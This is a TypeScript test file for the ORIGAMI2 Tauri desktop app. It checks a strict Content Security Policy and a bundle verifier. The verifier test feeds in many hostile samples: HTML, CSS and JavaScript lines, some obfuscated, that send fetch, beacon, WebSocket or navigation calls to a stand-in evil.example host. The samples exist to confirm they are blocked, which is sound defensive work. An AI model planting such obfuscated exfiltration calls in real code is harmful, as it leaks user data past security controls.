import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { linkSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { readFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import test from 'node:test'
import { ORIGAMI2_GITHUB_RELEASES_API_URL } from '../src/lib/githubReleaseUpdate.ts'

test('the desktop CSP permits only the fixed GitHub API update authority', async () => {
  const configText = await readFile(
    new URL('../src-tauri/tauri.conf.json', import.meta.url),
    'utf8',
  )
  const config: unknown = JSON.parse(configText)
  assert.ok(isRecord(config))
  assert.ok(isRecord(config.app))
  assert.ok(isRecord(config.app.security))
  assert.equal(typeof config.app.security.csp, 'string')

  const directives = parseCsp(config.app.security.csp)
  assert.deepEqual(directives.get('connect-src'), [
    "'self'",
    'ipc:',
    'http://ipc.localhost',
    'https://api.github.com',
  ])
  assert.deepEqual(directives.get('default-src'), ["'self'"])
  assert.deepEqual(directives.get('script-src'), ["'self'"])
  assert.deepEqual(directives.get('object-src'), ["'none'"])
  assert.deepEqual(directives.get('base-uri'), ["'none'"])
  assert.deepEqual(directives.get('frame-ancestors'), ["'none'"])
  assert.deepEqual(directives.get('frame-src'), ["'none'"])
  assert.deepEqual(directives.get('worker-src'), ["'none'"])
  assert.deepEqual(directives.get('media-src'), ["'none'"])
  assert.deepEqual(directives.get('manifest-src'), ["'none'"])
  assert.deepEqual(directives.get('font-src'), ["'self'"])
  assert.deepEqual(directives.get('img-src'), ["'self'", 'asset:', 'data:'])
  assert.deepEqual(directives.get('style-src'), ["'self'", "'unsafe-inline'"])
  assert.equal(config.app.security.csp.includes('blob:'), false)
  assert.equal(config.app.security.csp.includes("'unsafe-eval'"), false)
  assert.equal(config.app.security.csp.includes('localhost'), true)
  assert.equal(config.app.security.csp.includes('http://localhost'), false)
  assert.equal(config.app.security.csp.includes('ws://'), false)
  assert.equal(config.app.security.csp.includes('wss://'), false)
  assert.equal(config.app.security.csp.includes('*.github.com'), false)
  assert.equal(config.app.security.csp.includes('https://github.com'), false)
  assert.equal(config.app.security.csp.includes('http://api.github.com'), false)
})

test('bundle CSP verifier rejects linked and syntactically hidden authorities', () => {
  const verifier = resolve(import.meta.dirname, '..', '..', '..', '.github', 'scripts', 'verify_desktop_bundle_csp.mjs')
  const root = mkdtempSync(join(tmpdir(), 'origami2-bundle-csp-'))
  const assets = join(root, 'assets')
  mkdirSync(assets)
  const htmlPath = join(root, 'index.html')
  const jsPath = join(assets, 'app.js')
  const cssPath = join(assets, 'app.css')
  const validHtml = '<!doctype html><html><head><script type="module" crossorigin src="/assets/app.js"></script><link rel="stylesheet" crossorigin href="/assets/app.css"></head><body><div id="root"></div></body></html>'
  const verify = () => execFileSync(process.execPath, [verifier, root])
  try {
    writeFileSync(htmlPath, validHtml)
    writeFileSync(jsPath, 'export {}\n')
    writeFileSync(cssPath, '.root{color:#000}\n')
    verify()
    for (const hostile of [
      '<base href="https://evil.example/">',
      '<meta http-equiv="refresh" content="0;url=https://evil.example/">',
      '<img srcset="https://evil.example/a.png 1x">',
      '<link rel="modulepreload" href="//evil.example/chunk.js">',
      '<link rel="preload" href="data:text/javascript,alert(1)">',
      '<a href="/safe" ping="https://evil.example/collect">safe</a>',
      '<form action="https://evil.example/submit"></form>',
      '<button formaction="//evil.example/submit">submit</button>',
      '<link rel="prefetch" href="/next.html">',
      '<link rel="prerender" href="/next.html">',
      '<svg><use href="https://evil.example/icons.svg#x"></use></svg>',
      '<svg><image xlink:href="//evil.example/image.png"></image></svg>',
    ]) {
      writeFileSync(htmlPath, validHtml.replace('</head>', `${hostile}</head>`))
      assert.throws(verify)
    }
    writeFileSync(htmlPath, validHtml)
    for (const hostileCss of [
      '@\\69mport "https://evil.example/a.css";',
      '.x{background:u\\72l("data:image/png;base64,AA==")}',
      '@/* hidden */import url(https://evil.example/a.css);',
    ]) {
      writeFileSync(cssPath, hostileCss)
      assert.throws(verify)
    }
    writeFileSync(cssPath, '.root{color:#000}\n')
    for (const hostileJavaScript of [
      'import("./late.js")',
      'importScripts("/worker.js")',
      'new WebSocket("wss://evil.example")',
      'new EventSource("https://evil.example/events")',
      'fetch("https://evil.example/payload")',
      '//# sourceMappingURL=app.js.map',
      'f\\u0065tch("https://evil.example/payload")',
      'fetch("https" + "://evil.example/payload")',
      'fetch(`https://evil.example/payload`)',
      'globalThis["fe" + "tch"]("/hidden")',
      'window[`fetch`]("/hidden")',
      'new XML\\u0048ttpRequest()',
      'navigator["send" + "Beacon"]("/leak", data)',
      '(0, fetch)("https://evil.example/minified")',
      'new WebTransport("https://evil.example/session")',
      'new RTCPeerConnection().createDataChannel("leak")',
      'new webkitRTCPeerConnection()',
      'const Stream = EventSource; new Stream("https://evil.example/events")',
      'window.open("https://evil.example")',
      'globalThis["op" + "en"]("https://evil.example")',
      'location.assign("https://evil.example")',
      'window.location["replace"]("https://evil.example")',
      'navigation["navigate"]("https://evil.example")',
      'navigator.serviceWorker.register("/sw.js")',
      'new Worker("/worker.js")',
      'new SharedWorker("/shared.js")',
      'new BroadcastChannel("exfiltration")',
      'navigator.share({ title: "release", url: "https://evil.example" })',
      'navigator["share"]({url:"mailto:attacker@example.com"})',
      'window.open("intent://scan/#Intent;scheme=evil;end")',
      'location.assign("tel:+15551234567")',
      'navigation.navigate("sms:+15551234567")',
    ]) {
      writeFileSync(jsPath, hostileJavaScript)
      assert.throws(verify)
    }
    writeFileSync(jsPath, 'export {}\n')
    const hardlink = join(assets, 'hardlink.js')
    linkSync(jsPath, hardlink)
    assert.throws(verify)
    rmSync(hardlink)
    rmSync(jsPath)
    try {
      symlinkSync(cssPath, jsPath)
      assert.throws(verify)
    } catch (error) {
      if (!(error instanceof Error && 'code' in error && error.code === 'EPERM')) throw error
      const verifierSource = readFileSync(verifier, 'utf8')
      assert.match(verifierSource, /link\.isSymbolicLink\(\)/u)
    }
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('production update authority cannot be widened by origin credentials DNS aliases or dev proxy', async () => {
  const endpoint = new URL(ORIGAMI2_GITHUB_RELEASES_API_URL)
  assert.equal(endpoint.protocol, 'https:')
  assert.equal(endpoint.hostname, 'api.github.com')
  assert.equal(endpoint.host, 'api.github.com')
  assert.equal(endpoint.username, '')
  assert.equal(endpoint.password, '')
  assert.equal(endpoint.port, '')
  assert.equal(endpoint.search, '')
  assert.equal(endpoint.hash, '')
  assert.equal(
    endpoint.pathname,
    '/repos/oltotlo79-rgb/ORIGAMI2/releases/latest',
  )

  const tauriConfig = JSON.parse(await readFile(
    new URL('../src-tauri/tauri.conf.json', import.meta.url),
    'utf8',
  )) as { build?: { devUrl?: unknown; frontendDist?: unknown } }
  assert.equal(tauriConfig.build?.devUrl, 'http://localhost:1420')
  assert.equal(tauriConfig.build?.frontendDist, '../dist')

  const viteConfig = await readFile(
    new URL('../vite.config.ts', import.meta.url),
    'utf8',
  )
  assert.match(viteConfig, /host: '127\.0\.0\.1'/u)
  assert.match(viteConfig, /strictPort: true/u)
  assert.doesNotMatch(viteConfig, /proxy\s*:/u)
  assert.doesNotMatch(viteConfig, /changeOrigin|rewrite|api\.github\.com/iu)
  const serializedTauriConfig = JSON.stringify(tauriConfig)
  assert.doesNotMatch(serializedTauriConfig, /"devtools"\s*:\s*true/iu)
  assert.doesNotMatch(serializedTauriConfig, /dangerousDisableAssetCspModification/iu)
})

function parseCsp(value: string): Map<string, string[]> {
  const directives = new Map<string, string[]>()
  for (const source of value.split(';')) {
    const tokens = source.trim().split(/\s+/u)
    const name = tokens.shift()
    if (!name) continue
    assert.equal(directives.has(name), false)
    directives.set(name, tokens)
  }
  return directives
}

function isRecord(value: unknown): value is Record<string, unknown> {
  return value !== null && typeof value === 'object' && !Array.isArray(value)
}
